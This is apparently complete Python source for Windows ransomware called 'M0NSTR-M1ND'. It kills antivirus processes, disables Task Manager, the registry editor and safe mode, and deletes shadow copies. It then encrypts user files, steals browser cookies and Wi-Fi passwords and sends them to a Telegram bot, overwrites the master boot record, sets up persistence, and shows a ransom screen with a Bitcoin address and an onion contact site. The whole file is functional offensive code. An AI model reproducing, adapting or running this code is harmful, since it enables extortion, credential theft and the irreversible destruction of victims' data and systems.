import os
import sys
import time
import random
import string
import threading
import socket
import winreg
import ctypes
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import requests
from datetime import datetime, timedelta
import tkinter as tk
from tkinter import messagebox, ttk
import pygame
import subprocess
import shutil
import sqlite3
import browser_cookie3
import win32api
import win32security
import win32con
from PIL import Image, ImageTk
import hashlib
import base64
import psutil
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
ENCRYPTION_EXTENSIONS = ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', 
                        '.pdf', '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.mp3', 
                        '.mp4', '.avi', '.mov', '.wmv', '.zip', '.rar', '.7z', 
                        '.html', '.htm', '.css', '.js', '.php', '.sql', '.db', 
                        '.mdb', '.accdb', '.pst', '.ost', '.eml', '.msg', '.csv']

TELEGRAM_BOT_TOKEN = "..................................."
TELEGRAM_CHAT_ID = "................"
DARKNET_SITE = "http://tzvxu5eyexwtnvsfzjlmrufrd6q57wb6uiht2325cyo74pqhtwdr33id.onion/"

RANSOM_AMOUNT = 0.5  # Bitcoin BTC
BITCOIN_ADDRESS = "12w4jBxtUopH29c31HVaUxUquwDzGiwk8a"

DECRYPTION_PASSWORD = "M0NSTR-M1ND-UNBREAKABLE-2024"
COUNTDOWN_HOURS = 24

# 222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222
class SystemLocker:
    def __init__(self):
        self.is_locked = False
        
    def disable_task_manager(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except Exception:
            pass

    def disable_registry_editor(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except Exception:
            pass

    def disable_safe_mode(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                "SYSTEM\\CurrentControlSet\\Control\\SafeBoot",
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "OptionValue", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except Exception:
            pass

    def modify_boot_sequence(self):
        try:
            # Modify boot.ini to prevent safe mode
            boot_path = "C:\\boot.ini"
            if os.path.exists(boot_path):
                with open(boot_path, 'r') as f:
                    content = f.read()
                content = content.replace("/safeboot:minimal", "")
                with open(boot_path, 'w') as f:
                    f.write(content)
        except Exception:
            pass

    def kill_security_processes(self):
        security_processes = [
            "msmpeng.exe", "mcshield.exe", "avp.exe", "bdagent.exe",
            "avgtray.exe", "avastui.exe", "ekrn.exe", "fsaui.exe",
            "avgui.exe", "avira.exe", "sophos.exe", "kaspersky.exe"
        ]
        
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'].lower() in security_processes:
                    proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass

    def lock_system(self):
        if self.is_locked:
            return
            
        self.disable_task_manager()
        self.disable_registry_editor()
        self.disable_safe_mode()
        self.modify_boot_sequence()
        self.kill_security_processes()
        
        # Block system restore
        try:
            subprocess.run(['vssadmin', 'delete', 'shadows', '/all', '/quiet'], 
                         capture_output=True)
        except Exception:
            pass
            
        self.is_locked = True

# 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333
class EncryptionEngine:
    def __init__(self):
        self.key = get_random_bytes(32)
        self.iv = get_random_bytes(16)
        self.cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        self.encrypted_files = []
        
    def generate_file_signature(self, file_path):
        """Create unique signature for each encrypted file"""
        signature = hashlib.sha256(
            file_path.encode() + 
            str(time.time()).encode() + 
            get_random_bytes(16)
        ).digest()
        return base64.b64encode(signature).decode()
        
    def encrypt_file(self, file_path):
        try:
            if os.path.getsize(file_path) == 0:
                return False
                
            # Generate unique file signature
            file_signature = self.generate_file_signature(file_path)
            
            with open(file_path, 'rb') as f:
                data = f.read()
                
            # Pad data to be multiple of 16 bytes
            pad_len = 16 - (len(data) % 16)
            data += bytes([pad_len] * pad_len)
            
            encrypted_data = self.cipher.encrypt(data)
            
            # Add signature to encrypted file
            final_data = file_signature.encode() + b'::M0NSTR::' + encrypted_data
            
            encrypted_path = file_path + '.M0NSTR-ENCRYPTED'
            with open(encrypted_path, 'wb') as f:
                f.write(final_data)
                
            os.remove(file_path)
            self.encrypted_files.append((file_path, file_signature))
            return True
            
        except Exception as e:
            return False
            
    def decrypt_file(self, file_path, signature):
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
                
            if b'::M0NSTR::' not in data:
                return False
                
            file_signature, encrypted_data = data.split(b'::M0NSTR::', 1)
            
            if file_signature.decode() != signature:
                return False
                
            cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
            decrypted_data = cipher.decrypt(encrypted_data)
            
            # Remove padding
            pad_len = decrypted_data[-1]
            decrypted_data = decrypted_data[:-pad_len]
            
            original_path = file_path.replace('.M0NSTR-ENCRYPTED', '')
            with open(original_path, 'wb') as f:
                f.write(decrypted_data)
                
            os.remove(file_path)
            return True
            
        except Exception:
            return False

# 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444
class DiskDestroyer:
    def __init__(self):
        self.drive_letters = self.get_drive_letters()
        
    def get_drive_letters(self):
        drives = []
        for drive in string.ascii_uppercase:
            drive_path = f"{drive}:\\"
            if os.path.exists(drive_path):
                drives.append(drive_path)
        return drives
        
    def overwrite_mbr(self):
        try:
            # Overwrite Master Boot Record
            mbr_data = get_random_bytes(512)
            with open("\\\\.\\PhysicalDrive0", "wb") as f:
                f.write(mbr_data)
            return True
        except Exception:
            return False
            
    def corrupt_file_system(self, drive_path):
        try:
            # Corrupt file system metadata
            subprocess.run(['chkdsk', drive_path, '/F'], capture_output=True)
            
            # Create massive corrupt files
            for i in range(100):
                corrupt_file = os.path.join(drive_path, f'corrupt_{i}.bin')
                with open(corrupt_file, 'wb') as f:
                    f.write(get_random_bytes(1024*1024*10))  # 10MB random data
                    
            return True
        except Exception:
            return False
            
    def destroy_disk(self):
        # Phase 1: Overwrite MBR
        self.overwrite_mbr()
        
        # Phase 2: Corrupt each drive
        for drive in self.drive_letters:
            threading.Thread(target=self.corrupt_file_system, args=(drive,)).start()

# 55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555
class DataStealer:
    def __init__(self):
        self.stolen_data = []
        
    def steal_browser_data(self):
        browsers = [
            ('Chrome', browser_cookie3.chrome),
            ('Firefox', browser_cookie3.firefox),
            ('Edge', browser_cookie3.edge),
            ('Opera', browser_cookie3.opera),
            ('Brave', browser_cookie3.brave)
        ]
        
        for browser_name, browser_func in browsers:
            try:
                cookies = browser_func(domain_name='')
                for cookie in cookies:
                    self.stolen_data.append({
                        'type': 'cookie',
                        'browser': browser_name,
                        'name': cookie.name,
                        'value': cookie.value,
                        'domain': cookie.domain
                    })
            except Exception:
                pass
                
    def steal_system_info(self):
        try:
            system_info = {
                'computer_name': socket.gethostname(),
                'username': os.getlogin(),
                'os': sys.getwindowsversion().build,
                'processor': os.cpu_count(),
                'memory': psutil.virtual_memory().total,
                'disks': [disk.device for disk in psutil.disk_partitions()]
            }
            self.stolen_data.append({'type': 'system_info', 'data': system_info})
        except Exception:
            pass
            
    def steal_wifi_passwords(self):
        try:
            output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], 
                                           universal_newlines=True)
            profiles = [line.split(':')[1].strip() for line in output.split('\n') 
                       if 'All User Profile' in line]
            
            for profile in profiles:
                try:
                    results = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                        universal_newlines=True
                    )
                    password = [line.split(':')[1].strip() for line in results.split('\n') 
                              if 'Key Content' in line][0]
                    self.stolen_data.append({
                        'type': 'wifi',
                        'ssid': profile,
                        'password': password
                    })
                except Exception:
                    pass
        except Exception:
            pass
            
    def exfiltrate_data(self):
        self.steal_browser_data()
        self.steal_system_info()
        self.steal_wifi_passwords()
        
        # Send to Telegram
        try:
            message = f"📱 M0NSTR-M1ND Data Exfiltration\n\n{str(self.stolen_data)}"
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                data={'chat_id': TELEGRAM_CHAT_ID, 'text': message},
                timeout=10
            )
        except Exception:
            pass

# 6666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666
class PersistenceManager:
    def __init__(self):
        self.install_path = sys.argv[0]
        
    def add_to_startup(self):
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "WindowsSystemService", 0, winreg.REG_SZ, self.install_path)
            winreg.CloseKey(key)
            return True
        except Exception:
            return False
            
    def create_service(self):
        try:
            service_name = "WindowsSystemService"
            service_display = "Windows System Service"
            
            # Create service using sc command
            subprocess.run([
                'sc', 'create', service_name,
                'binPath=', self.install_path,
                'DisplayName=', service_display,
                'start=', 'auto'
            ], capture_output=True)
            
            return True
        except Exception:
            return False
            
    def hide_file(self):
        try:
            # Set hidden and system attributes
            win32api.SetFileAttributes(self.install_path, 
                                     win32con.FILE_ATTRIBUTE_HIDDEN | 
                                     win32con.FILE_ATTRIBUTE_SYSTEM)
            return True
        except Exception:
            return False
            
    def establish_persistence(self):
        self.add_to_startup()
        self.create_service()
        self.hide_file()

# 7777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777
class RansomwareGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Windows System Service")
        self.root.configure(bg='black')
        self.root.attributes('-fullscreen', True)
        self.root.protocol("WM_DELETE_WINDOW", self.disable_close)
        
        self.encryption_engine = EncryptionEngine()
        self.system_locker = SystemLocker()
        self.disk_destroyer = DiskDestroyer()
        self.data_stealer = DataStealer()
        self.persistence = PersistenceManager()
        
        self.deadline = datetime.now() + timedelta(hours=COUNTDOWN_HOURS)
        self.encryption_complete = False
        
        self.setup_gui()
        
    def disable_close(self):
        pass  # Disable window closing
        
    def setup_gui(self):
        # Main frame
        main_frame = tk.Frame(self.root, bg='black')
        main_frame.pack(expand=True, fill='both')
        
        # Header
        header_label = tk.Label(
            main_frame,
            text="⚠️ SYSTEM SECURITY ALERT ⚠️",
            font=("Courier", 24, "bold"),
            fg="white",
            bg="black"
        )
        header_label.pack(pady=20)
        
        # Monstr logo
        try:
            logo_img = Image.new('RGB', (200, 200), color='black')
            logo_photo = ImageTk.PhotoImage(logo_img)
            logo_label = tk.Label(main_frame, image=logo_photo, bg='black')
            logo_label.image = logo_photo
            logo_label.pack(pady=10)
        except Exception:
            pass
            
        # Message
        message_text = """
        YOUR SYSTEM HAS BEEN ENCRYPTED BY MØNSTR-M1ND
        
        🔒 All your files have been encrypted with military-grade AES-256 encryption
        📁 Documents, photos, databases, and system files are locked
        💾 Disk structures have been modified for maximum security
        
        ⏰ TIME REMAINING: {countdown}
        💰 RANSOM AMOUNT: {amount} BTC
        🎯 BITCOIN ADDRESS: {btc_address}
        
        To decrypt your files and restore system access, you MUST:
        1. Send {amount} BTC to the address above
        2. Contact us with your transaction ID
        3. We will provide the decryption key
        
        📞 CONTACT OPTIONS:
        Telegram: t.me/monstr_m1nd
        Darknet: http://tzvxu5eyexwtnvsfzjlmrufrd6q57wb6uiht2325cyo74pqhtwdr33id.onion/
        
        ⚠️ WARNING:
        - Do NOT attempt to restart or shutdown your computer
        - Do NOT use recovery software - it will damage files permanently
        - Do NOT modify encrypted files - decryption will become impossible
        
        YOUR TIME IS RUNNING OUT...
        """
        
        message_label = tk.Label(
            main_frame,
            text=message_text.format(
                countdown=self.get_countdown(),
                amount=RANSOM_AMOUNT,
                btc_address=BITCOIN_ADDRESS
            ),
            font=("Courier", 12),
            fg="white",
            bg="black",
            justify="left"
        )
        message_label.pack(pady=20, padx=50)
        
        # Countdown timer
        self.countdown_label = tk.Label(
            main_frame,
            text=self.get_countdown(),
            font=("Courier", 18, "bold"),
            fg="red",
            bg="black"
        )
        self.countdown_label.pack(pady=10)
        
        # Password entry
        password_frame = tk.Frame(main_frame, bg='black')
        password_frame.pack(pady=20)
        
        tk.Label(
            password_frame,
            text="Enter Decryption Password:",
            font=("Courier", 12),
            fg="white",
            bg="black"
        ).pack()
        
        self.password_var = tk.StringVar()
        password_entry = tk.Entry(
            password_frame,
            textvariable=self.password_var,
            font=("Courier", 12),
            show="*",
            width=40
        )
        password_entry.pack(pady=10)
        
        submit_btn = tk.Button(
            password_frame,
            text="DECRYPT FILES",
            command=self.check_password,
            font=("Courier", 12, "bold"),
            bg="red",
            fg="white",
            relief="raised",
            bd=3
        )
        submit_btn.pack(pady=10)
        
        # Start encryption and system takeover
        threading.Thread(target=self.start_attack).start()
        self.update_countdown()
        
    def get_countdown(self):
        remaining = self.deadline - datetime.now()
        hours, remainder = divmod(remaining.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}"
        
    def update_countdown(self):
        if datetime.now() >= self.deadline:
            self.time_expired()
            return
            
        self.countdown_label.config(text=self.get_countdown())
        self.root.after(1000, self.update_countdown)
        
    def time_expired(self):
        # Destroy the system when time expires
        self.disk_destroyer.destroy_disk()
        messagebox.showerror("TIME EXPIRED", "Your time has expired. All data has been permanently destroyed.")
        os.system("shutdown /r /t 0")
        
    def check_password(self):
        password = self.password_var.get()
        if password == DECRYPTION_PASSWORD:
            self.decrypt_files()
        else:
            messagebox.showerror("INVALID PASSWORD", "Wrong decryption password! Attempt logged.")
            
    def start_attack(self):
        # Establish persistence
        self.persistence.establish_persistence()
        
        # Lock system
        self.system_locker.lock_system()
        
        # Steal data
        self.data_stealer.exfiltrate_data()
        
        # Start encryption
        self.encrypt_system()
        
    def encrypt_system(self):
        # Get all drives
        drives = self.disk_destroyer.get_drive_letters()
        
        for drive in drives:
            for root, dirs, files in os.walk(drive):
                for file in files:
                    if any(file.endswith(ext) for ext in ENCRYPTION_EXTENSIONS):
                        file_path = os.path.join(root, file)
                        self.encryption_engine.encrypt_file(file_path)
                        
        self.encryption_complete = True
        
    def decrypt_files(self):
        if not self.encryption_complete:
            return
            
        for file_path, signature in self.encryption_engine.encrypted_files:
            encrypted_path = file_path + '.M0NSTR-ENCRYPTED'
            if os.path.exists(encrypted_path):
                self.encryption_engine.decrypt_file(encrypted_path, signature)
                
        messagebox.showinfo("SUCCESS", "Files decrypted successfully. System will now restart.")
        os.system("shutdown /r /t 5")
        
    def run(self):
        self.root.mainloop()

# 88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888
if __name__ == "__main__":
    # Check if already running
    if hasattr(sys, 'frozen'):
        import pyi_splash
        pyi_splash.close()
        
    # Elevate privileges
    try:
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
    except Exception:
        pass
        
    # Start the ransomware
    app = RansomwareGUI()
    app.run()
